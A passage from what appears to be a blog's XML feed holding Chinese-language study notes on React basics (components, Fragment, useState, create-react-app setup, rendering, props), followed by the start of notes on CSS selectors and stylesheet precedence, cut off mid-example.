的神奇之处：你可以只定义组件一次，然后按需多处和多次使用。</li></ul><p><strong>3）注意事项</strong></p><ul><li>不能嵌套组件的定义，即在一个组件中不能直接定义另一个组件</li><li>当子组件需要使用父组件的数据时，你需要 <a href="https://zh-hans.react.dev/learn/passing-props-to-a-component">通过 props 的形式进行传递</a></li></ul></li><li><p><strong>每一个组件只能一个根元素</strong></p><p><strong>1）原因</strong></p><ul><li>不管是vue还是react，模板都将被编译为render函数，而函数的返回值只能是一个，所以如果不用单独的根节点包住，就会并列返回多个返回值，这在js中是不允许的。</li><li>除了这一点，还有一个主要是原因是，react和vue都将把模板的内容转换为对应的元素，最后建立起虚拟dom树，而树状结构只能有唯一的根节点，这样在后续的虚拟dom数据有变化时，可以检查到具体更改的位置。如果有多个根节点，则不能明确到底要在哪个树上查找更新。</li></ul><p><strong>2）如何返回多个元素？使用Fragment将它们包裹到一个共享的父级中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function App()&#123;</span><br><span class="line">  const list = [</span><br><span class="line">    &#123;id : 1, name : &#x27;a&#x27;&#125;,</span><br><span class="line">    &#123;id : 2, name : &#x27;b&#x27;&#125;, </span><br><span class="line">    &#123;id : 3, name : &#x27;c&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">  </span><br><span class="line">  // 像这样在组件中并列返回多个根元素是不可行的</span><br><span class="line">  // const listConent = list.map(item =&gt; (</span><br><span class="line">  //   &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">  //   &lt;li&gt;----------------------&lt;/li&gt;</span><br><span class="line">  // ))</span><br><span class="line">  </span><br><span class="line">  const listConent = list.map(item =&gt; (</span><br><span class="line">    &lt;Fragment key = &#123;item.id&#125;&gt;</span><br><span class="line">      &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;----------------------&lt;/li&gt;</span><br><span class="line">    &lt;/Fragment&gt;</span><br><span class="line">  ))</span><br><span class="line">  </span><br><span class="line">  return(</span><br><span class="line">    &lt;ul&gt;&#123;listConent&#125;&lt;/ul&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><blockquote><p>Fragment 的详细用法：<a href="https://zh-hans.react.dev/reference/react/Fragment">React中文文档 | Fragment</a></p></blockquote></li><li><p><strong>标签属性设置</strong></p><ul><li>使用 <code>className</code> 来设置 CSS 的class</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import image from &#x27;./logo.svg&#x27;</span><br><span class="line">function App() &#123;</span><br><span class="line">  const imgData = &#123;</span><br><span class="line">    className: &#x27;small&#x27;,</span><br><span class="line">    style: &#123;</span><br><span class="line">      width: 200,</span><br><span class="line">      height: 200,</span><br><span class="line">      backgroundColor: &#x27;grey&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        src=&#123;image&#125;</span><br><span class="line">        alt=&quot;&quot;</span><br><span class="line">        &#123;...imgData&#125;</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li></ol><h1 id="react-hook"><a href="#react-hook" class="headerlink" title="react hook"></a>react hook</h1><ol><li><p><strong>基本概念</strong></p><p>react的思想在于将组件尽量写成纯函数，如果需要外部功能和副作用，就用钩子把外部代码”钩”进来。 </p><p>react Hooks 是一些可以让你在函数组件中“钩入” React 状态和生命周期功能的特殊函数。它们可以解决一些 class 组件中常见的问题，并且使代码更加简洁和可读。</p><p>因为所有的钩子都是为函数引入外部功能，所以 React 约定，<strong>钩子一律使用<code>use</code>前缀命名</strong>，便于识别。你要使用 xxx 功能，钩子就命名为 usexxx。</p><blockquote><p>react hook的功能在某些方面比较类似于库函数，对一些特定的功能进行了封装，可以更加方便地重复使用。但是不同的是库函数式独立的，不依赖于特定的上下文或框架，例如，数学库函数（如<code>Math.sqrt</code>）可以在任何 JavaScript 代码中使用。但是react hook只能在React 函数组件或自定义 Hook 中使用。</p></blockquote></li><li><p><strong>React 内置 Hook</strong></p><p><strong>1）useState()</strong></p><ul><li><p>定义：用于在函数组件中进行状态变更</p></li><li><p>语法：</p><ul><li><p>content：需要渲染的内容</p></li><li><p>setContent：用于更新状态的函数, 后续调用该函数进行状态更新操作。</p><blockquote><p> <strong>注意在对对象进行更新的时候，一定要把所有的键值对都写上去</strong>，即使没有改变也要写，因为这里的逻辑是用新的对象直接覆盖掉原有的对象，如果没有将不变的键值对写上去会直接失去这些键值对。</p><p>将所有属性都写上去又比较繁琐，所以我们可以在前面加上 <strong><code>...content</code></strong>，表示将content的所有属性先写在这里，后面再写上需要改变的键值对来覆盖掉前面的值。</p></blockquote></li><li><p>useState()内接收状态的初始值。</p><p>这里的初始内容可以为变量、对象的形式</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const [content, setContent] = useState(&quot;初始内容&quot;);</span><br><span class="line">const [content,setContent] = useState(&#123;</span><br><span class="line">    title: &#x27;默认标题&#x27;,</span><br><span class="line">    content: &#x27;默认内容&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// setContent后面为更新后的内容</span><br><span class="line">setContent(&#x27;新内容&#x27;)</span><br><span class="line">function handClick()&#123;</span><br><span class="line">    setContent(&#123;</span><br><span class="line">        ...content,</span><br><span class="line">        content: &#x27;新内容&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; useState &#125; from &quot;react&quot;;</span><br><span class="line"></span><br><span class="line">export default function  Button()  &#123;</span><br><span class="line">  const  [buttonText, setButtonText] =  useState(&quot;Click me,   please&quot;);</span><br><span class="line"></span><br><span class="line">  function handleClick()  &#123;</span><br><span class="line">    return setButtonText(&quot;Thanks, been clicked!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return  &lt;button  onClick=&#123;handleClick&#125;&gt;&#123;buttonText&#125;&lt;/button&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="初始化应用"><a href="#初始化应用" class="headerlink" title="初始化应用"></a>初始化应用</h1><ol><li><p><strong>环境要求</strong></p><ul><li><p>安装 Node.js。Node 包括 npm（Node 程序包管理器）和 npx（Node 程序包运行器）</p><ul><li>也可以使用Yarn作为npm的替代方案</li></ul></li><li><p>设置npm的镜像源</p><ul><li><p>查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure></li><li><p>更改为淘宝源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>初始化应用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app reacttest</span><br></pre></td></tr></table></figure><ul><li><p>输入命令后会在 reacttest 文件夹下面构建好应用程序的基础架构</p><p><strong>注意项目名字只能是小写，不能大小写混合</strong></p></li><li><p>处理完成之后，可以 cd 到 <code>reacttest</code> 文件夹下，然后键入 <code>npm start</code> 命令并回车，先前由 create-react-app 创建的脚本会启动一个本地服务 <a href="localhost:3000">localhost:3000</a>，并打开你的默认浏览器来访问这个服务。成功启动浏览器的话，你的浏览器上会显示如下画面，表示初始化成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240718165830913.png" alt="image-20240718165830913"></p></li></ul></li><li><p><strong>文件结构</strong></p><ul><li><p>src文件夹： 存放React 应用源码的目录。</p><p>可以保留该目录下的这两个文件，其他文件都不重要，可以直接全部删除</p><ul><li><p><code>index.js</code> ：入口文件</p></li><li><p><code>APP.js</code> ：根组件文件</p><blockquote><p>react中的一个重要思想：其包括两种组件形式</p><ul><li>函数形式（主流）</li><li>类形式</li></ul></blockquote></li></ul></li></ul></li><li><p><strong>APP.js组件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import logo from &quot;./logo.svg&quot;;</span><br><span class="line">import &quot;./App.css&quot;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div className=&quot;App&quot;&gt;</span><br><span class="line">      &lt;header className=&quot;App-header&quot;&gt;</span><br><span class="line">        &lt;img src=&#123;logo&#125; className=&quot;App-logo&quot; alt=&quot;logo&quot; /&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">          Edit &lt;code&gt;src/App.js&lt;/code&gt; and save to reload.</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;a</span><br><span class="line">          className=&quot;App-link&quot;</span><br><span class="line">          href=&quot;https://reactjs.org&quot;</span><br><span class="line">          target=&quot;_blank&quot;</span><br><span class="line">          rel=&quot;noopener noreferrer&quot;&gt;</span><br><span class="line">          Learn React</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><p>可以看到组件文件由三部分组成：import语句、APP组件函数和底部的export语句</p><ul><li><p>import语句：允许在此脚本中使用其他文件中的代码</p><p>在这里引入我们需要的本地文件，包括css、图片等</p></li><li><p>APP组件函数</p><p>返回一个JSX表达式，<strong>该表达式定义了浏览器最终需要渲染的DOM</strong></p></li><li><p>export语句：在 <code>App.js</code> 文件的最底部</p><p> <code>export default App</code> 语句使得 <code>App</code> 组件能被其他模块使用。</p></li></ul><p>**插值的实现：**通过括号 + 变量名称。可以在标签内容和属性部分进行插值</p><ul><li>注意使用{}进行插值的方式</li><li>注意jsx的语法，在给divContent赋值的时候并不需要使用引号，直接写标签即可</li></ul></li><li><p><strong>index.js入口文件</strong></p></li></ol><h1 id="渲染方式"><a href="#渲染方式" class="headerlink" title="渲染方式"></a>渲染方式</h1><ol><li><p><strong>条件渲染</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function App() &#123;</span><br><span class="line">  const divTitle = &#x27;标签标题&#x27;</span><br><span class="line">  const flag = true</span><br><span class="line"></span><br><span class="line">  let divContent = null</span><br><span class="line">  if (flag)&#123;</span><br><span class="line">    divContent = &lt;span&gt;flag为true&lt;/span&gt;</span><br><span class="line">  &#125; else&#123;</span><br><span class="line">    divContent = &lt;p&gt;flag为false&lt;/p&gt;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div title = &#123;divTitle&#125;&gt;&#123;divContent&#125;&lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li><li><p><strong>数组渲染</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function App()&#123;</span><br><span class="line">  const list = [</span><br><span class="line">    &#123;id : 1, name : &#x27;a&#x27;&#125;,</span><br><span class="line">    &#123;id : 2, name : &#x27;b&#x27;&#125;, </span><br><span class="line">    &#123;id : 3, name : &#x27;c&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">  const listConent = list.map(item =&gt; (</span><br><span class="line">    &lt;li key = &#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">    // 下面这样会报warning，没有key，没有唯一性</span><br><span class="line">    //&lt;li&gt;&#123;item.name&#125;&lt;/li&gt;</span><br><span class="line">  ))</span><br><span class="line"></span><br><span class="line">  return(</span><br><span class="line">    &lt;ul&gt;&#123;listConent&#125;&lt;/ul&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure><ul><li><p>在react中遍历数据时，推荐在组件中使用 key 属性。这里的数组最好要设置一个key，保证当前元素的唯一性（即上面的id，一般在后端设置好这样的形态再返回到前端）</p><blockquote><p>这样处理的原因是可以适配diff算法，更高效地创建react元素树以更新UI</p><p>详情可以参考：<a href="https://blog.csdn.net/Golden_soft/article/details/83090785">React总结：一文知React</a></p></blockquote></li></ul></li><li><p><strong>响应事件与状态更新</strong></p><p>注意要使用 useState 进行状态的更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import &#123; useState &#125; from &#x27;react&#x27;;</span><br><span class="line">function App()&#123;</span><br><span class="line">  const [content,setContent] = useState(&quot;初始内容&quot;)</span><br><span class="line"></span><br><span class="line">  function handClick()&#123;</span><br><span class="line">    setContent(&quot;新内容&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;div&gt;&#123;content&#125;&lt;/div&gt;</span><br><span class="line">      &lt;button onClick=&#123;handClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure></li></ol><h1 id="组件间数据共享：props"><a href="#组件间数据共享：props" class="headerlink" title="组件间数据共享：props"></a>组件间数据共享：props</h1><h2 id="父组件传递数据给子组件"><a href="#父组件传递数据给子组件" class="headerlink" title="父组件传递数据给子组件"></a>父组件传递数据给子组件</h2><ol><li><p>定义：React 组件使用 <em>props</em> 来互相通信。每个父组件都可以提供 props 给它的子组件，从而将一些信息传递给它</p></li><li><p>语法：</p><ul><li><p>预定义 props 后将其传递给子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 父组件Profile将person和size传递给子组件Avatar</span><br><span class="line">export default function Profile() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;Avatar</span><br><span class="line">      // 这里为什么使用双括号：第一个括号表示传递，第二个括号是表示对象</span><br><span class="line">      person=&#123;&#123; name: &#x27;Lin Lanying&#x27;, imageId: &#x27;1bX5QH6&#x27; &#125;&#125;</span><br><span class="line">      size=&#123;100&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在子组件中读取 props </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 在子组件中读取 person 和 size</span><br><span class="line">function Avatar(&#123; person, size = 100 &#125;) &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;img</span><br><span class="line">      className=&quot;avatar&quot;</span><br><span class="line">      src=&#123;getImageUrl(person)&#125;</span><br><span class="line">      alt=&#123;person.name&#125;</span><br><span class="line">      width=&#123;size&#125;</span><br><span class="line">      height=&#123;size&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>size = 100</code> ：设置Prop的默认值</li></ul></li></ul></li><li><p>将 JSX 作为子组件传递（组件插槽）</p><ul><li><p>可以直接将JSX传递，父组件将在名为 <code>children</code> 的 prop 中接收到该内容。使用标签头和标签尾来闭合</p></li><li><p>如果除了 children 中的 JSX ，还想要传递一些预定义的 prop的话，也可以设置自闭和传递</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function List(&#123; children, title, footer = &lt;div&gt;默认底部&lt;/div&gt; &#125;) &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;h2&gt;&#123;title&#125;&lt;/h2&gt;</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &#123;footer&#125;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default function App() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;List</span><br><span class="line">        title=&quot;列表1&quot;</span><br><span class="line">        footer=&#123;&lt;p&gt;这是底部内容1&lt;/p&gt;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;li&gt;内容1&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容2&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容3&lt;/li&gt;</span><br><span class="line">      &lt;/List&gt;</span><br><span class="line">      &lt;List</span><br><span class="line">        title=&quot;列表2&quot;</span><br><span class="line">        footer=&#123;&lt;p&gt;这是底部内容2&lt;/p&gt;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;li&gt;内容A&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容B&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;内容C&lt;/li&gt;</span><br><span class="line">      &lt;/List&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="子组件传递数据给父组件"><a href="#子组件传递数据给父组件" class="headerlink" title="子组件传递数据给父组件"></a>子组件传递数据给父组件</h2><p>这里想要在子组件中status的值发生变化后，<strong>回传</strong>status给父组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import &#123; useState &#125; from &quot;react&quot;;</span><br><span class="line"></span><br><span class="line">// 子组件调用父组件传递过来的函数，将发生变化的值传递到父组件中的function handleActive中</span><br><span class="line">function Detail(&#123; onActive &#125;) &#123;</span><br><span class="line">  const [status, setStatus] = useState(false);</span><br><span class="line"></span><br><span class="line">  function handleClick() &#123;</span><br><span class="line">    setStatus(!status);</span><br><span class="line">    // 调用父组件传递过来的函数</span><br><span class="line">    onActive(status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;</span><br><span class="line">      &lt;p style=&#123;&#123; display: status ? &#x27;block&#x27; : &#x27;none&#x27; &#125;&#125;&gt;Detail的内容&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 父组件传递一个函数handleActive给子组件</span><br><span class="line">export default function App() &#123;</span><br><span class="line">  function handleActive(status) &#123;</span><br><span class="line">    console.log(status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;Detail onActive=&#123;handleActive&#125; /&gt;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="同级组件之间的数据传递"><a href="#同级组件之间的数据传递" class="headerlink" title="同级组件之间的数据传递"></a>同级组件之间的数据传递</h2><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://yixirumeng.github.io/2018/10/08/react-and-vue2-component-single-root/">分析React、Vue组件为什么必须只能有一个根元素</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』CSS学习</title>
      <link href="/posts/192b.html"/>
      <url>/posts/192b.html</url>
      
        <content type="html"><![CDATA[<p>本文记录对HTML基础知识的学习，主要内容基于 <a href="https://www.runoob.com/css/css-tutorial.html">CSS 教程 | 菜鸟教程</a></p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>定义</strong></p><p><strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，CSS文件扩展名为 <code>.css</code>。</p></li><li><p><strong>CSS文档的基本结构</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240711103357915.png" alt="image-20240711103357915"></p></li></ol><h1 id="id选择器和class选择器"><a href="#id选择器和class选择器" class="headerlink" title="id选择器和class选择器"></a>id选择器和class选择器</h1><ol><li><p><strong>id选择器</strong></p><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式，以 “#” 来定义。</p><p>以下的样式规则应用于元素属性 id&#x3D;”para1”:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#para1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>class选择器</strong></p><p>class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。类选择器以一个点 <code>.</code> 号显示：</p><ul><li><p>在以下的例子中，所有拥有 center 类的 HTML 元素均为居中。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.center</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure></li><li><p>还可以指定特定的HTML元素使用class</p><p>在以下实例中, 所有的 p 元素使用 class&#x3D;”center” 让该元素的文本居中:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.center</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>class可以在多个元素中使用，class之间以空格分隔即可</p><p>例如这里的p标签就使用了center和color两个class，以空格分隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;center color&quot;</span>&gt;</span>段落居中，颜色为红色。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>标签选择器（直接对某个标签定义样式）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="样式表"><a href="#样式表" class="headerlink" title="样式表"></a>样式表</h1><ol><li><p><strong>插入样式表的方法</strong></p><p>有三种，在HTML学习的博客中已经进行了详细的介绍</p><ul><li><p>外部样式表(External style sheet)</p></li><li><p>内部样式表(Internal style sheet)</p></li><li><p>内联样式(Inline style)</p></li></ul></li><li><p><strong>多重样式</strong></p><ul><li><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从<strong>更具体的样式表</strong>中被<strong>继承</strong>过来。 </p><p>如果在不同的样式表中出现了多个相同的属性，那么优先级如下：</p><p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p><p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">    